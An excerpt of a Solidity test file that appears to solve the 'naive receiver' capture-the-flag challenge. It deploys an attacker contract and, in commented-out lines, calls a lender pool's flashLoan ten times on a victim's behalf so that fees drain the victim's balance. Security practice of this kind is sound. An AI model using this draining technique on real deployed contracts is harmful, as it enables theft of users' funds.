...
import {AttackNaiveReceiver} from "../../../src/Contracts/naive-receiver/AttackNaiveReceiver.sol";
...
contract NaiveReceiver is Test {
    ...
    function testExploit() public {
         ...
         * EXPLOIT START *
         */
        console.log("Balance before: ", address(flashLoanReceiver).balance);
        new AttackNaiveReceiver(address(flashLoanReceiver), payable(naiveReceiverLenderPool));
        // for (uint256 i = 0; i < 10; i++) {
        //     naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1 ether);
        // }
        // naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1 ether);
        console.log("Balance after: ", address(flashLoanReceiver).balance);
        /**
         * EXPLOIT END *
         */
        validation();
